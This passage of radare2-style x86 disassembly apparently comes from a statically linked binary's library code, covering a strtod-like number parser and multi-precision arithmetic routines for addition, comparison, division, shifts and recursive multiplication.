jle 0x808a8bb
test ebx, ebx
js 0x808bee7
jmp 0x808a8bb
mov esi, esi
dec dword [var_108ch]
jmp 0x808bee7
mov esi, dword [var_108ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x808bf05
jmp 0x808bf40
dec dword [var_108ch]
dec dword [var_1090h]
mov edx, dword [var_108ch]
cmp byte [edx - 1], 0x30
je 0x808bf64
jmp 0x808beb9
inc edi
mov dword [var_10b8h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x808c0e8
cmp al, 0x2b
je 0x808c0df
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0d4
cmp dword [var_1078h], 0x10
je 0x808c0a1
mov eax, dword [var_10b8h]
test eax, eax
je 0x808c08a
mov edx, dword [var_1094h]
add edx, 0x1383
mov eax, dword [var_106ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_106ch], ebx
jg 0x808c01e
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_106ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808bfd3
mov esi, dword [var_10b8h]
test esi, esi
je 0x808be9b
neg ebx
mov dword [var_106ch], ebx
jmp 0x808be9b
cmp dword [var_1098h], 0xffffffff
je 0x808c078
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_10b8h]
test eax, eax
jne 0x808c074
mov eax, dword [var_1074h]
test eax, eax
je 0x808c06c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x808c04c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808c04c
fldz
jmp 0x808c04c
mov eax, dword [var_1074h]
test eax, eax
je 0x808c074
fld dword [0x80a6104]
jmp 0x808c04c
mov eax, dword [var_1098h]
sub eax, dword [var_1094h]
lea edx, [eax + 0x1344]
jmp 0x808bfd3
mov eax, dword [var_10b8h]
mov ecx, dword [var_1094h]
test eax, eax
lea edx, [ecx*4 + 0x403d]
jne 0x808bfd3
mov edx, dword [var_1098h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x4000]
jmp 0x808bfd3
mov edi, dword [var_108ch]
jmp 0x808be9b
inc edi
movzx esi, byte [edi]
jmp 0x808bfa1
mov dword [var_10b8h], 1
jmp 0x808c0df
cmp dword [ecx + eax*4], 0x70
jmp 0x808be95
cmp dword [var_1078h], 0x10
je 0x808c116
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808be7e
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
jmp 0x808be7e
nop
lea esi, [esi]
mov edx, esi
movsx eax, dl
jmp 0x808c10b
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
jmp 0x808be09
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a806
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x808a7cb
cmp eax, 0x66
ja 0x808a7cb
inc dword [var_1090h]
jmp 0x808a800
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x808c1aa
cmp dl, byte [ecx + 0x198]
jle 0x808a7a3
xor ebx, ebx
cmp byte [var_1111h], 0
je 0x808a7a3
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808a7a3
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808c1c2
jmp 0x808a7a3
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a78b
mov ecx, esi
cmp cl, 0x30
jne 0x808a78f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x808c1f8
jmp 0x808a78f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808a731
add edi, 2
mov dword [var_1078h], 0x10
movzx esi, byte [edi]
mov dword [var_10a4h], 0
jmp 0x808a731
lea esi, [esi]
test al, al
jne 0x808a54d
jmp 0x808a53d
mov edx, dword [var_109ch]
movzx eax, byte [edx]
jmp 0x808c240
inc edi
movzx esi, byte [edi]
jmp 0x808a504
mov dword [var_1074h], 1
jmp 0x808c258
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808a440
leave
ret
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808c2d8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808c2d5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
adc eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
adc eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
adc eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
adc eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
adc eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
adc eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
adc eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
adc eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808c2d8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
dec edx
js 0x808c34b
mov eax, dword [ecx + edx*4]
cmp dword [ebx + edx*4], eax
jne 0x808c350
dec edx
jns 0x808c340
xor eax, eax
pop ebx
leave
ret
seta al
movzx eax, al
lea eax, [eax + eax - 1]
jmp 0x808c34d
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
cmp dword [arg_1ch], 1
mov dword [var_10h], 0
mov esi, dword [arg_14h]
je 0x808c67e
jle 0x808c665
cmp dword [arg_1ch], 2
je 0x808c55b
mov eax, esi
mov ebx, dword [arg_10h]
mov edi, dword [arg_1ch]
sub eax, dword [arg_1ch]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_1ch]
lea ebx, [ebx + eax*4]
mov eax, dword [arg_18h]
mov dword [arg_10h], ebx
mov edi, dword [eax + edi*4 - 4]
mov edx, dword [eax + edx*4 - 8]
mov dword [var_2ch], edi
mov dword [var_20h], edx
mov edi, ebx
mov ebx, dword [ebx + ecx*4 - 4]
cmp ebx, dword [var_2ch]
jb 0x808c42a
ja 0x808c3fc
mov eax, ecx
mov dword [esp], edi
dec eax
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [var_4h], eax
call fcn.0808c330
test eax, eax
js 0x808c42a
mov ebx, dword [arg_10h]
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808d570
mov dword [var_10h], 1
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
mov ebx, dword [eax + edi*4 - 4]
mov eax, dword [arg_ch]
add eax, esi
sub eax, dword [arg_1ch]
dec eax
mov dword [var_1ch], eax
js 0x808c50a
lea esi, [esi]
mov edx, dword [arg_ch]
cmp dword [var_1ch], edx
jl 0x808c529
sub dword [arg_10h], 4
mov ecx, dword [arg_1ch]
mov esi, dword [arg_10h]
mov ecx, dword [esi + ecx*4]
mov dword [var_24h], ecx
cmp ebx, dword [var_2ch]
mov esi, 0xffffffff
je 0x808c4b0
mov edx, dword [arg_1ch]
mov ecx, dword [arg_10h]
mov eax, dword [ecx + edx*4 - 4]
mov edx, ebx
div dword [var_2ch]
mov ecx, edx
mov esi, eax
mov eax, dword [var_20h]
mul esi
cmp edx, ecx
mov ebx, eax
jbe 0x808c515
add ecx, dword [var_2ch]
dec esi
cmp ecx, dword [var_2ch]
jb 0x808c4b0
cmp ebx, dword [var_20h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_20h]
cmp edx, ecx
ja 0x808c488
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
nop
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
mov ebx, dword [arg_10h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], ebx
call fcn.0808d600
cmp dword [var_24h], eax
je 0x808c4ed
mov edi, dword [arg_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
dec esi
mov dword [var_ch], edi
mov dword [var_8h], eax
call fcn.0808c2a0
mov edx, dword [var_1ch]
mov ecx, dword [arg_8h]
mov edi, dword [arg_10h]
mov dword [ecx + edx*4], esi
dec edx
mov esi, dword [arg_1ch]
mov dword [var_1ch], edx
mov ebx, dword [edi + esi*4 - 4]
jns 0x808c440
mov eax, dword [var_10h]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
jmp 0x808c4b0
mov esi, dword [arg_1ch]
mov edi, dword [arg_10h]
mov edx, dword [arg_1ch]
mov esi, dword [edi + esi*4 - 4]
dec edx
mov dword [var_24h], esi
js 0x808c54d
lea esi, [esi]
mov edi, dword [arg_10h]
mov eax, dword [edi + edx*4]
mov dword [edi + edx*4 + 4], eax
dec edx
jns 0x808c540
mov eax, dword [arg_10h]
mov dword [eax], 0
jmp 0x808c45c
mov edi, dword [arg_10h]
mov ecx, dword [arg_18h]
mov ebx, dword [arg_18h]
lea eax, [edi + esi*4]
mov ecx, dword [ecx + 4]
lea edx, [eax - 8]
mov ebx, dword [ebx]
mov eax, dword [eax - 8]
mov dword [arg_10h], edx
mov edx, dword [edx + 4]
mov dword [var_18h], ecx
mov dword [var_30h], ebx
cmp edx, ecx
jb 0x808c595
ja 0x808c588
cmp eax, ebx
jb 0x808c595
mov dword [var_10h], 1
sub eax, dword [var_30h]
sbb edx, dword [var_18h]
mov ecx, dword [arg_ch]
lea esi, [esi + ecx - 3]
test esi, esi
mov dword [var_14h], esi
js 0x808c608
mov ebx, dword [arg_ch]
cmp dword [var_14h], ebx
jl 0x808c657
sub dword [arg_10h], 4
cmp edx, dword [var_18h]
je 0x808c615
div dword [var_18h]
mov dword [var_2ch], eax
mov ecx, edx
mul dword [var_30h]
mov esi, dword [arg_10h]
mov esi, dword [esi]
mov dword [var_28h], esi
nop
lea esi, [esi]
cmp edx, ecx
ja 0x808c5db
jne 0x808c5ec
cmp eax, dword [var_28h]
jbe 0x808c5ec
add ecx, dword [var_18h]
dec dword [var_2ch]
sub eax, dword [var_30h]
sbb edx, 0
cmp ecx, dword [var_18h]
jae 0x808c5d0
mov edi, dword [var_14h]
mov esi, dword [var_2ch]
mov ebx, dword [arg_8h]
mov dword [ebx + edi*4], esi
mov edi, dword [var_28h]
sub edi, eax
sbb ecx, edx
mov eax, edi
mov edx, ecx
dec dword [var_14h]
jns 0x808c5a3
mov ecx, dword [arg_10h]
mov dword [ecx + 4], edx
mov dword [ecx], eax
jmp 0x808c50a
lea ecx, [edx + eax]
mov dword [var_2ch], 0xffffffff
cmp ecx, edx
jae 0x808c642
sub ecx, dword [var_30h]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edi]
mov edx, ecx
mov ecx, dword [var_14h]
add eax, dword [var_30h]
adc edx, 0
mov dword [ebx + ecx*4], 0xffffffff
jmp 0x808c603
mov edx, dword [var_30h]
lea eax, [edx - 1]
test edx, edx
cmovne edx, eax
mov eax, dword [var_30h]
neg eax
jmp 0x808c5c3
mov esi, dword [arg_10h]
mov dword [esi], 0
jmp 0x808c5b3
mov eax, dword [arg_1ch]
test eax, eax
jne 0x808c3ad
mov eax, 1
cdq
idiv dword [var_10h]
jmp 0x808c50d
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov ebx, dword [eax]
mov ecx, dword [edx + esi*4 - 4]
cmp ecx, ebx
jb 0x808c697
sub ecx, ebx
mov dword [var_10h], 1
mov eax, dword [arg_8h]
mov edi, dword [arg_ch]
lea eax, [eax + edi*4]
mov edi, esi
sub edi, 2
mov dword [arg_8h], eax
js 0x808c6bf
mov edx, dword [arg_10h]
mov esi, dword [arg_8h]
mov eax, dword [edx + edi*4]
mov edx, ecx
div ebx
mov dword [esi + edi*4], eax
mov ecx, edx
dec edi
jns 0x808c6aa
mov eax, dword [arg_ch]
mov edi, dword [arg_ch]
shl eax, 2
sub dword [arg_8h], eax
dec edi
js 0x808c6e1
xor esi, esi
mov edx, ecx
mov eax, esi
div ebx
mov ecx, edx
mov edx, dword [arg_8h]
mov dword [edx + edi*4], eax
dec edi
jns 0x808c6d0
mov ebx, dword [arg_10h]
mov dword [ebx], ecx
jmp 0x808c50a
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
sub esi, 4
mov ebx, dword [esi + edx*4]
xor eax, eax
shld eax, ebx, cl
dec edx
je 0x808c73f
push eax
test dl, 1
jne 0x808c72a
mov eax, ebx
lea esi, [esi]
mov ebx, dword [esi + edx*4]
shld eax, ebx, cl
mov dword [edi + edx*4], eax
dec edx
mov eax, dword [esi + edx*4]
shld ebx, eax, cl
mov dword [edi + edx*4], ebx
dec edx
jne 0x808c720
shl eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shl ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
lea edi, [edi + edx*4 - 4]
lea esi, [esi + edx*4]
neg edx
mov ebx, dword [esi + edx*4]
xor eax, eax
shrd eax, ebx, cl
inc edx
je 0x808c79f
push eax
test dl, 1
jne 0x808c78a
mov eax, ebx
nop
mov ebx, dword [esi + edx*4]
shrd eax, ebx, cl
mov dword [edi + edx*4], eax
inc edx
mov eax, dword [esi + edx*4]
shrd ebx, eax, cl
mov dword [edi + edx*4], ebx
inc edx
jne 0x808c780
shr eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shr ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov edi, dword [arg_8h]
add eax, dword [arg_18h]
cmp dword [arg_18h], 0x1f
lea eax, [edi + eax*4 - 4]
mov dword [var_10h], eax
jg 0x808c8d3
mov edx, dword [arg_18h]
xor eax, eax
test edx, edx
je 0x808c851
mov edx, dword [arg_14h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808c8b4
je 0x808c891
xor eax, eax
cmp eax, dword [arg_10h]
jge 0x808c814
mov dword [edi + eax*4], 0
inc eax
cmp eax, dword [arg_10h]
jl 0x808c807
xor eax, eax
mov ecx, dword [arg_10h]
mov ebx, 1
mov dword [edi + ecx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jge 0x808c851
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx + ebx*4]
cmp eax, 1
ja 0x808c875
mov eax, 0
je 0x808c859
mov edx, dword [arg_10h]
inc ebx
mov dword [edi + edx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jl 0x808c830
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_ch], ecx
mov dword [var_8h], eax
call fcn.0808c2a0
jmp 0x808c842
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808c842
xor edx, edx
cmp edx, dword [arg_10h]
jge 0x808c814
lea esi, [esi]
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [edi + edx*4], eax
inc edx
cmp edx, dword [arg_10h]
jl 0x808c8a0
jmp 0x808c814
mov dword [var_ch], eax
mov edx, dword [arg_ch]
mov dword [esp], edi
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cae0
jmp 0x808c816
mov ecx, dword [arg_18h]
mov edx, dword [arg_14h]
lea ebx, [ecx*8 + 0x10]
sub esp, ebx
mov dword [var_ch], ecx
lea eax, [var_23h]
mov dword [var_8h], edx
mov ecx, dword [arg_ch]
and eax, 0xfffffff0
mov dword [esp], edi
mov dword [var_18h], eax
mov dword [var_sp_10h], eax
mov dword [var_4h], ecx
call fcn.0808cc10
mov eax, dword [arg_18h]
mov edx, dword [arg_18h]
sub dword [arg_10h], edx
shl eax, 2
add dword [arg_ch], eax
add edi, eax
cmp dword [arg_10h], edx
jl 0x808c9d8
sub esp, ebx
mov dword [var_20h], eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
mov dword [var_1ch], ecx
cmp dword [arg_18h], 0x1f
jg 0x808cab3
mov eax, dword [arg_18h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov eax, dword [var_1ch]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cb40
mov edx, dword [var_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_ch], eax
call fcn.0808c2a0
mov ecx, dword [var_20h]
mov dword [var_14h], eax
mov esi, dword [arg_18h]
lea ebx, [ecx + edi]
mov ecx, dword [var_1ch]
add ecx, dword [var_20h]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca90
mov esi, dword [arg_18h]
dec esi
je 0x808c9c0
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca90
dec esi
jne 0x808c9a5
nop
lea esi, [esi]
mov edx, dword [arg_18h]
add edi, dword [var_20h]
sub dword [arg_10h], edx
mov eax, dword [var_20h]
add dword [arg_ch], eax
cmp dword [arg_10h], edx
jge 0x808c930
mov eax, dword [arg_10h]
test eax, eax
jne 0x808c9e9
mov edx, dword [var_10h]
mov eax, dword [edx]
jmp 0x808c851
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov edx, dword [arg_18h]
mov dword [var_sp_10h], ecx
mov dword [var_ch], eax
mov ecx, dword [arg_14h]
mov eax, dword [var_18h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808c7c0
mov dword [esp], edi
mov edx, dword [arg_18h]
mov ecx, dword [var_18h]
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808c2a0
mov dword [var_14h], eax
mov ecx, dword [var_18h]
mov esi, dword [arg_10h]
mov eax, dword [arg_18h]
shl eax, 2
add ecx, eax
lea ebx, [eax + edi]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca6d
dec esi
je 0x808c9df
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca6d
dec esi
jne 0x808ca56
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9df
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9df
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ca80
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9c0
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9c0
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808caa3
jmp 0x808c9c0
mov edx, dword [var_18h]
mov ecx, dword [arg_18h]
mov eax, dword [arg_14h]
mov dword [var_sp_10h], edx
mov dword [var_ch], ecx
mov edx, dword [arg_ch]
mov ecx, dword [var_1ch]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cc10
jmp 0x808c95a
nop
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
mov dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808cb00
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_10h]
mov edi, dword [arg_14h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808cbf0
je 0x808cbd9
xor eax, eax
cmp eax, edi
jge 0x808cb71
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808cb65
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808cb9f
mov edx, dword [arg_10h]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808cbc0
mov eax, 0
je 0x808cba7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808cb82
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov dword [var_ch], edi
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_8h], ecx
call fcn.0808c2a0
jmp 0x808cb94
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.08090d80
jmp 0x808cb94
xor edx, edx
cmp edx, edi
jge 0x808cb71
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808cbe0
jmp 0x808cb71
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808cb73
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_14h], 1
je 0x808ccd1
mov esi, dword [arg_14h]
dec esi
cmp esi, 0x1f
jg 0x808cca8
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov eax, dword [edx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov ecx, dword [arg_14h]
mov eax, dword [edx + esi*4]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [arg_10h]
mov dword [var_4h], eax
call fcn.08090d80
mov ecx, dword [arg_14h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_ch]
mov dword [var_10h], eax
mov dword [var_8h], edx
mov eax, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cc49
mov esi, dword [arg_14h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d03c
mov edx, dword [arg_10h]
lea eax, [esi*4]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cb40
mov eax, dword [arg_ch]
mov dword [var_8h], esi
lea ebx, [eax + esi*4]
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d016
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.0808d570
mov dword [var_bp_10h], 0
mov ecx, dword [arg_10h]
lea edi, [esi*4]
mov dword [var_8h], esi
mov ebx, ecx
mov dword [var_4h], ecx
add ebx, edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808cff5
mov eax, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
add eax, edi
mov dword [esp], eax
call fcn.0808d570
xor dword [var_bp_10h], 1
cmp esi, 0x1f
jg 0x808cfc9
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
lea eax, [ecx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [esp], eax
call fcn.0808cb40
test esi, esi
jle 0x808cdd5
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov edx, esi
lea ebx, [ecx + esi*4]
lea ecx, [ecx + eax*4]
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808cdc8
mov edi, dword [arg_14h]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov ecx, dword [arg_14h]
add edi, esi
lea eax, [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov ebx, eax
mov eax, dword [var_bp_10h]
test eax, eax
je 0x808cfa2
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808cf76
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_18h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov eax, dword [arg_18h]
mov edx, dword [arg_8h]
mov ecx, dword [arg_14h]
mov dword [var_8h], eax
lea eax, [edx + esi*4]
mov dword [var_ch], ecx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808ceb0
mov eax, dword [arg_8h]
mov dword [var_14h], esi
lea ecx, [eax + edi*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808cf50
mov edx, esi
dec edx
mov dword [var_14h], edx
je 0x808ceb0
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf50
dec dword [var_14h]
jne 0x808ce98
xor edx, edx
cmp edx, esi
jge 0x808cec7
mov ecx, dword [arg_18h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ceb6
mov edx, dword [arg_18h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
